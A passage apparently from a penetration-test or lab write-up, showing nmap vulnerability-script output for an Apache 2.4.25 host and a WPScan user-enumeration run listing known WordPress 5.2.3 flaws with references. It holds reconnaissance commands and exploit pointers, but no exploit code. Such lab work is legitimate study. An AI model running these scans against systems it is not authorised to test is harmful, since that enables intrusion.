    |       BD3652A9-D066-57BA-9943-4E34970463B9    7.5     https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9  *EXPLOIT*
    |       B0208442-6E17-5772-B12D-B5BE30FA5540    7.5     https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540  *EXPLOIT*
    |       A6687F08-B033-5AE7-84F5-DE799491DA2F    7.5     https://vulners.com/githubexploit/A6687F08-B033-5AE7-84F5-DE799491DA2F  *EXPLOIT*
    |       A66531EB-3C47-5C56-B8A6-E04B54E9D656    7.5     https://vulners.com/githubexploit/A66531EB-3C47-5C56-B8A6-E04B54E9D656  *EXPLOIT*
    |       A0F268C8-7319-5637-82F7-8DAF72D14629    7.5     https://vulners.com/githubexploit/A0F268C8-7319-5637-82F7-8DAF72D14629  *EXPLOIT*
    |       9ED8A03D-FE34-5F77-8C66-C03C9615AF07    7.5     https://vulners.com/gitee/9ED8A03D-FE34-5F77-8C66-C03C9615AF07  *EXPLOIT*
    |       9814661A-35A4-5DB7-BB25-A1040F365C81    7.5     https://vulners.com/githubexploit/9814661A-35A4-5DB7-BB25-A1040F365C81  *EXPLOIT*
    |       56EC26AF-7FB6-5CF0-B179-6151B1D53BA5    7.5     https://vulners.com/githubexploit/56EC26AF-7FB6-5CF0-B179-6151B1D53BA5  *EXPLOIT*
    |       45D138AD-BEC6-552A-91EA-8816914CA7F4    7.5     https://vulners.com/githubexploit/45D138AD-BEC6-552A-91EA-8816914CA7F4  *EXPLOIT*
    |       40879618-C556-547C-8769-9E63E83D0B55    7.5     https://vulners.com/githubexploit/40879618-C556-547C-8769-9E63E83D0B55  *EXPLOIT*
    |       1F6E0709-DA03-564E-925F-3177657C053E    7.5     https://vulners.com/githubexploit/1F6E0709-DA03-564E-925F-3177657C053E  *EXPLOIT*
    |       135C45BD-4652-5EEE-8890-2D3C62709016    7.5     https://vulners.com/githubexploit/135C45BD-4652-5EEE-8890-2D3C62709016  *EXPLOIT*
    |       1337DAY-ID-35422        7.5     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
    |       CVE-2025-49812  7.4     https://vulners.com/cve/CVE-2025-49812
    |       HTTPD:D66D5F45690EBE82B48CC81EF6388EE8  7.3     https://vulners.com/httpd/HTTPD:D66D5F45690EBE82B48CC81EF6388EE8
    |       CVE-2023-38709  7.3     https://vulners.com/cve/CVE-2023-38709
    |       CVE-2020-35452  7.3     https://vulners.com/cve/CVE-2020-35452
    |       CNVD-2024-36395 7.3     https://vulners.com/cnvd/CNVD-2024-36395
    |       EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    7.2     https://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB    *EXPLOIT*
    |       1337DAY-ID-32502        7.2     https://vulners.com/zdt/1337DAY-ID-32502        *EXPLOIT*
    |       CVE-2024-24795  6.3     https://vulners.com/cve/CVE-2024-24795
    |       CNVD-2024-36394 6.3     https://vulners.com/cnvd/CNVD-2024-36394
    |       HTTPD:E3E8BE7E36621C4506552BA051ECC3C8  6.1     https://vulners.com/httpd/HTTPD:E3E8BE7E36621C4506552BA051ECC3C8
    |       HTTPD:8DF9389A321028B4475CE2E9B5BFC7A6  6.1     https://vulners.com/httpd/HTTPD:8DF9389A321028B4475CE2E9B5BFC7A6
    |       HTTPD:5FF2D6B51D8115FFCB653949D8D36345  6.1     https://vulners.com/httpd/HTTPD:5FF2D6B51D8115FFCB653949D8D36345
    |       CVE-2020-1927   6.1     https://vulners.com/cve/CVE-2020-1927
    |       CVE-2019-10098  6.1     https://vulners.com/cve/CVE-2019-10098
    |       CVE-2019-10092  6.1     https://vulners.com/cve/CVE-2019-10092
    |       CNVD-2020-21904 6.1     https://vulners.com/cnvd/CNVD-2020-21904
    |       CAB023BA-58A3-5C35-BF97-F9C43133DB5E    6.1     https://vulners.com/gitee/CAB023BA-58A3-5C35-BF97-F9C43133DB5E  *EXPLOIT*
    |       4013EC74-B3C1-5D95-938A-54197A58586D    6.1     https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D  *EXPLOIT*
    |       HTTPD:BC9528EF49BF5C3A4F7A85994496ACD5  5.9     https://vulners.com/httpd/HTTPD:BC9528EF49BF5C3A4F7A85994496ACD5
    |       HTTPD:87E6488B7C543F4421D1060636F72213  5.9     https://vulners.com/httpd/HTTPD:87E6488B7C543F4421D1060636F72213
    |       HTTPD:5C83890838E7C6903630B41EC3F2540D  5.9     https://vulners.com/httpd/HTTPD:5C83890838E7C6903630B41EC3F2540D
    |       CVE-2023-45802  5.9     https://vulners.com/cve/CVE-2023-45802
    |       CVE-2018-1302   5.9     https://vulners.com/cve/CVE-2018-1302
    |       CVE-2018-1301   5.9     https://vulners.com/cve/CVE-2018-1301
    |       CVE-2018-11763  5.9     https://vulners.com/cve/CVE-2018-11763
    |       CNVD-2018-20078 5.9     https://vulners.com/cnvd/CNVD-2018-20078
    |       CNVD-2018-06536 5.9     https://vulners.com/cnvd/CNVD-2018-06536
    |       CNVD-2018-06535 5.9     https://vulners.com/cnvd/CNVD-2018-06535
    |       1337DAY-ID-33577        5.8     https://vulners.com/zdt/1337DAY-ID-33577        *EXPLOIT*
    |       HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05  5.5     https://vulners.com/httpd/HTTPD:B900BFA5C32A54AB9D565F59C8AC1D05
    |       CVE-2020-13938  5.5     https://vulners.com/cve/CVE-2020-13938
    |       CNVD-2021-44765 5.5     https://vulners.com/cnvd/CNVD-2021-44765
    |       HTTPD:FCCF5DB14D66FA54B47C34D9680C0335  5.3     https://vulners.com/httpd/HTTPD:FCCF5DB14D66FA54B47C34D9680C0335
    |       HTTPD:EB26BC6B6E566C865F53A311FC1A6744  5.3     https://vulners.com/httpd/HTTPD:EB26BC6B6E566C865F53A311FC1A6744
    |       HTTPD:C1BCB024FBDBA4C7909CE6FABA8E1422  5.3     https://vulners.com/httpd/HTTPD:C1BCB024FBDBA4C7909CE6FABA8E1422
    |       HTTPD:BAAB4065D254D64A717E8A5C847C7BCA  5.3     https://vulners.com/httpd/HTTPD:BAAB4065D254D64A717E8A5C847C7BCA
    |       HTTPD:AA09285A8811F9F8A1F82F45122331AD  5.3     https://vulners.com/httpd/HTTPD:AA09285A8811F9F8A1F82F45122331AD
    |       HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F  5.3     https://vulners.com/httpd/HTTPD:8806CE4EFAA6A567C7FAD62778B6A46F
    |       HTTPD:5C8B0394DE17D1C29719B16CE00F475D  5.3     https://vulners.com/httpd/HTTPD:5C8B0394DE17D1C29719B16CE00F475D
    |       HTTPD:25716876F18D7575B7A8778A4476ED9E  5.3     https://vulners.com/httpd/HTTPD:25716876F18D7575B7A8778A4476ED9E
    |       CVE-2022-37436  5.3     https://vulners.com/cve/CVE-2022-37436
    |       CVE-2022-28614  5.3     https://vulners.com/cve/CVE-2022-28614
    |       CVE-2022-28330  5.3     https://vulners.com/cve/CVE-2022-28330
    |       CVE-2020-1934   5.3     https://vulners.com/cve/CVE-2020-1934
    |       CVE-2019-17567  5.3     https://vulners.com/cve/CVE-2019-17567
    |       CVE-2019-0220   5.3     https://vulners.com/cve/CVE-2019-0220
    |       CVE-2019-0196   5.3     https://vulners.com/cve/CVE-2019-0196
    |       CVE-2018-17189  5.3     https://vulners.com/cve/CVE-2018-17189
    |       CVE-2018-1283   5.3     https://vulners.com/cve/CVE-2018-1283
    |       CNVD-2023-30859 5.3     https://vulners.com/cnvd/CNVD-2023-30859
    |       CNVD-2022-53582 5.3     https://vulners.com/cnvd/CNVD-2022-53582
    |       CNVD-2022-51059 5.3     https://vulners.com/cnvd/CNVD-2022-51059
    |       CNVD-2021-44766 5.3     https://vulners.com/cnvd/CNVD-2021-44766
    |       CNVD-2020-46278 5.3     https://vulners.com/cnvd/CNVD-2020-46278
    |       CNVD-2020-29872 5.3     https://vulners.com/cnvd/CNVD-2020-29872
    |       CNVD-2019-08941 5.3     https://vulners.com/cnvd/CNVD-2019-08941
    |       CNVD-2019-02938 5.3     https://vulners.com/cnvd/CNVD-2019-02938
    |       SSV:96537       5.0     https://vulners.com/seebug/SSV:96537    *EXPLOIT*
    |       EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    5.0     https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D    *EXPLOIT*
    |       EXPLOITPACK:2666FB0676B4B582D689921651A30355    5.0     https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355    *EXPLOIT*
    |       1337DAY-ID-28573        5.0     https://vulners.com/zdt/1337DAY-ID-28573        *EXPLOIT*
    |       1337DAY-ID-33575        4.3     https://vulners.com/zdt/1337DAY-ID-33575        *EXPLOIT*
    |       PACKETSTORM:152441      0.0     https://vulners.com/packetstorm/PACKETSTORM:152441      *EXPLOIT*
    |_      1337DAY-ID-26497        0.0     https://vulners.com/zdt/1337DAY-ID-26497        *EXPLOIT*
    |_http-server-header: Apache/2.4.25 (Debian)
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.0.0.18
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://10.0.0.18:80/
    |     Form id: search-form-1
    |     Form action: http://10.0.0.18/
    |     
    |     Path: http://10.0.0.18:80/?m=201909
    |     Form id: search-form-1
    |     Form action: http://10.0.0.18/
    |     
    |     Path: http://10.0.0.18:80/?cat=1
    |     Form id: search-form-1
    |_    Form action: http://10.0.0.18/
    | http-headers: 
    |   Date: Sat, 15 Nov 2025 12:35:10 GMT
    |   Server: Apache/2.4.25 (Debian)
    |   Link: <http://10.0.0.18/index.php?rest_route=/>; rel="https://api.w.org/"
    |   Vary: Accept-Encoding
    |   Connection: close
    |   Transfer-Encoding: chunked
    |   Content-Type: text/html; charset=UTF-8
    |   
    |_  (Request type: GET)
```

### WPScan

```bash
    $ wpscan --url http://10.0.0.18/ --api-token {API_TOKEN} --enumerate u 
    _______________________________________________________________
            __          _______   _____
            \ \        / /  __ \ / ____|
            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
            \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
                \  /\  /  | |     ____) | (__| (_| | | | |
                \/  \/   |_|    |_____/ \___|\__,_|_| |_|

            WordPress Security Scanner by the WPScan Team
                            Version 3.8.28
        Sponsored by Automattic - https://automattic.com/
        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
    _______________________________________________________________

    [+] URL: http://10.0.0.18/ [10.0.0.18]
    [+] Started: Sat Nov 15 05:42:51 2025

    Interesting Finding(s):

    [+] Headers
    | Interesting Entry: Server: Apache/2.4.25 (Debian)
    | Found By: Headers (Passive Detection)
    | Confidence: 100%

    [+] XML-RPC seems to be enabled: http://10.0.0.18/xmlrpc.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%
    | References:
    |  - http://codex.wordpress.org/XML-RPC_Pingback_API
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
    |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

    [+] WordPress readme found: http://10.0.0.18/readme.html
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%

    [+] Upload directory has listing enabled: http://10.0.0.18/wp-content/uploads/
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 100%

    [+] The external WP-Cron seems to be enabled: http://10.0.0.18/wp-cron.php
    | Found By: Direct Access (Aggressive Detection)
    | Confidence: 60%
    | References:
    |  - https://www.iplocation.net/defend-wordpress-from-ddos
    |  - https://github.com/wpscanteam/wpscan/issues/1299

    [+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-04).
    | Found By: Rss Generator (Passive Detection)
    |  - http://10.0.0.18/?feed=rss2, <generator>https://wordpress.org/?v=5.2.3</generator>
    |  - http://10.0.0.18/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.2.3</generator>
    |
    | [!] 64 vulnerabilities identified:
    |
    | [!] Title: WordPress <= 5.2.3 - Stored XSS in Customizer
    |     Fixed in: 5.2.4
    |     References:
    |      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
    |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
    |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
    |
    | [!] Title: WordPress <= 5.2.3 - Unauthenticated View Private/Draft Posts
    |     Fixed in: 5.2.4
    |     References:
    |      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
    |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
    |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
    |      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
    |      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
    |
    | [!] Title: WordPress <= 5.2.3 - Stored XSS in Style Tags
    |     Fixed in: 5.2.4
    |     References:
    |      - https://wpscan.com/vulnerability/d005b1f8-749d-438a-8818-21fba45c6465
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17672
    |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
    |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
    |
    | [!] Title: WordPress <= 5.2.3 - JSON Request Cache Poisoning
    |     Fixed in: 5.2.4
    |     References:
    |      - https://wpscan.com/vulnerability/7804d8ed-457a-407e-83a7-345d3bbe07b2
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17673
    |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
    |      - https://github.com/WordPress/WordPress/commit/b224c251adfa16a5f84074a3c0886270c9df38de
    |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
    |
    | [!] Title: WordPress <= 5.2.3 - Server-Side Request Forgery (SSRF) in URL Validation 
    |     Fixed in: 5.2.4
    |     References:
    |      - https://wpscan.com/vulnerability/26a26de2-d598-405d-b00c-61f71cfacff6
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17669
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17670
    |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
    |      - https://github.com/WordPress/WordPress/commit/9db44754b9e4044690a6c32fd74b9d5fe26b07b2
    |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
    |
    | [!] Title: WordPress <= 5.2.3 - Admin Referrer Validation
    |     Fixed in: 5.2.4
    |     References:
    |      - https://wpscan.com/vulnerability/715c00e3-5302-44ad-b914-131c162c3f71
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17675
    |      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
    |      - https://github.com/WordPress/WordPress/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0
    |      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
    |
    | [!] Title: WordPress <= 5.3 - Authenticated Improper Access Controls in REST API
    |     Fixed in: 5.2.5
    |     References:
    |      - https://wpscan.com/vulnerability/4a6de154-5fbd-4c80-acd3-8902ee431bd8
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20043
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16788
    |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-g7rg-hchx-c2gw
    |
    | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Crafted Links
    |     Fixed in: 5.2.5
    |     References:
    |      - https://wpscan.com/vulnerability/23553517-34e3-40a9-a406-f3ffbe9dd265
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20042
    |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
    |      - https://hackerone.com/reports/509930
    |      - https://github.com/WordPress/wordpress-develop/commit/1f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xvg2-m2f4-83m7
    |
    | [!] Title: WordPress <= 5.3 - Authenticated Stored XSS via Block Editor Content
    |     Fixed in: 5.2.5
    |     References:
    |      - https://wpscan.com/vulnerability/be794159-4486-4ae1-a5cc-5c190e5ddf5f
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16781
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16780
    |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pg4x-64rh-3c9v
    |
    | [!] Title: WordPress <= 5.3 - wp_kses_bad_protocol() Colon Bypass
    |     Fixed in: 5.2.5
    |     References:
    |      - https://wpscan.com/vulnerability/8fac612b-95d2-477a-a7d6-e5ec0bb9ca52
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-20041
    |      - https://wordpress.org/news/2019/12/wordpress-5-3-1-security-and-maintenance-release/
    |      - https://github.com/WordPress/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53
    |
    | [!] Title: WordPress < 5.4.1 - Password Reset Tokens Failed to Be Properly Invalidated
    |     Fixed in: 5.2.6
    |     References:
    |      - https://wpscan.com/vulnerability/7db191c0-d112-4f08-a419-a1cd81928c4e
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11027
    |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
    |      - https://core.trac.wordpress.org/changeset/47634/
    |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-ww7v-jg8c-q6jw
    |
    | [!] Title: WordPress < 5.4.1 - Unauthenticated Users View Private Posts
    |     Fixed in: 5.2.6
    |     References:
    |      - https://wpscan.com/vulnerability/d1e1ba25-98c9-4ae7-8027-9632fb825a56
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11028
    |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
    |      - https://core.trac.wordpress.org/changeset/47635/
    |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-xhx9-759f-6p2w
    |
    | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Customizer
    |     Fixed in: 5.2.6
    |     References:
    |      - https://wpscan.com/vulnerability/4eee26bd-a27e-4509-a3a5-8019dd48e429
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11025
    |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
    |      - https://core.trac.wordpress.org/changeset/47633/
    |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4mhg-j6fx-5g3c
    |
    | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in Search Block
    |     Fixed in: 5.2.6
    |     References:
    |      - https://wpscan.com/vulnerability/e4bda91b-067d-45e4-a8be-672ccf8b1a06
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11030
    |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
    |      - https://core.trac.wordpress.org/changeset/47636/
    |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-vccm-6gmc-qhjh
    |
    | [!] Title: WordPress < 5.4.1 - Cross-Site Scripting (XSS) in wp-object-cache
    |     Fixed in: 5.2.6
    |     References:
    |      - https://wpscan.com/vulnerability/e721d8b9-a38f-44ac-8520-b4a9ed6a5157
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11029
    |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
    |      - https://core.trac.wordpress.org/changeset/47637/
    |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-568w-8m88-8g2c
    |
    | [!] Title: WordPress < 5.4.1 - Authenticated Cross-Site Scripting (XSS) in File Uploads
    |     Fixed in: 5.2.6
    |     References:
    |      - https://wpscan.com/vulnerability/55438b63-5fc9-4812-afc4-2f1eff800d5f
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-11026
    |      - https://wordpress.org/news/2020/04/wordpress-5-4-1/
    |      - https://core.trac.wordpress.org/changeset/47638/
    |      - https://www.wordfence.com/blog/2020/04/unpacking-the-7-vulnerabilities-fixed-in-todays-wordpress-5-4-1-security-update/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-3gw2-4656-pfr2
    |      - https://hackerone.com/reports/179695
    |
    | [!] Title: WordPress <= 5.2.3 - Hardening Bypass
    |     Fixed in: 5.2.4
    |     References:
    |      - https://wpscan.com/vulnerability/378d7df5-bce2-406a-86b2-ff79cd699920
    |      - https://blog.ripstech.com/2020/wordpress-hardening-bypass/
    |      - https://hackerone.com/reports/436928
    |      - https://wordpress.org/news/2019/11/wordpress-5-2-4-update/
    |
    | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
    |     Fixed in: 5.2.7
    |     References:
    |      - https://wpscan.com/vulnerability/831e4a94-239c-4061-b66e-f5ca0dbb84fa
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4046
    |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rpwf-hrh2-39jf
    |      - https://pentest.co.uk/labs/research/subtle-stored-xss-wordpress-core/
    |      - https://www.youtube.com/watch?v=tCh7Y8z8fb4
    |
    | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
    |     Fixed in: 5.2.7
    |     References:
    |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
    |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
    |
    | [!] Title: WordPress < 5.4.2 - Open Redirection
    |     Fixed in: 5.2.7
    |     References:
    |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
    |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
    |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
    |
    | [!] Title: WordPress < 5.4.2 - Authenticated Stored XSS via Theme Upload
    |     Fixed in: 5.2.7
    |     References:
    |      - https://wpscan.com/vulnerability/d8addb42-e70b-4439-b828-fd0697e5d9d4
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4049
    |      - https://www.exploit-db.com/exploits/48770/
    |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-87h4-phjv-rm6p
    |      - https://hackerone.com/reports/406289
    |
    | [!] Title: WordPress < 5.4.2 - Misuse of set-screen-option Leading to Privilege Escalation
    |     Fixed in: 5.2.7
    |     References:
    |      - https://wpscan.com/vulnerability/b6f69ff1-4c11-48d2-b512-c65168988c45
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4050
    |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
    |      - https://github.com/WordPress/WordPress/commit/dda0ccdd18f6532481406cabede19ae2ed1f575d
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-4vpv-fgg2-gcqc
    |
    | [!] Title: WordPress < 5.4.2 - Disclosure of Password-Protected Page/Post Comments
    |     Fixed in: 5.2.7
    |     References:
    |      - https://wpscan.com/vulnerability/eea6dbf5-e298-44a7-9b0d-f078ad4741f9
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25286
    |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
    |      - https://github.com/WordPress/WordPress/commit/c075eec24f2f3214ab0d0fb0120a23082e6b1122
    |
    | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure
    |     Fixed in: 5.2.10
    |     References:
    |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450
    |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/
    |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq
    |      - https://core.trac.wordpress.org/changeset/50717/
    |      - https://www.youtube.com/watch?v=J2GXmxAdNWs
    |
    | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer
    |     Fixed in: 5.2.11
    |     References:
    |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296
    |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62
    |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/
    |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9
    |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/
    |      - https://www.youtube.com/watch?v=HaW15aMzBUM
    |
    | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate
    |     Fixed in: 5.2.13
    |     References:
    |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d
    |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/
    |      - https://core.trac.wordpress.org/ticket/54207
    |
    | [!] Title: WordPress < 5.8 - Plugin Confusion
    |     Fixed in: 5.8
    |     References:
    |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223
    |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/
    |
    | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query
    |     Fixed in: 5.2.14
    |     References:
    |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84
    |      - https://hackerone.com/reports/1378209
    |
    | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs
    |     Fixed in: 5.2.14
    |     References:
    |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w
    |      - https://hackerone.com/reports/425342
    |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability
    |
    | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query
    |     Fixed in: 5.2.14
    |     References:
    |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86
    |
    | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites
    |     Fixed in: 5.2.14
    |     References:
    |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7
    |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663
    |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h
    |      - https://hackerone.com/reports/541469
    |
    | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery
    |     Fixed in: 5.2.15
    |     References:
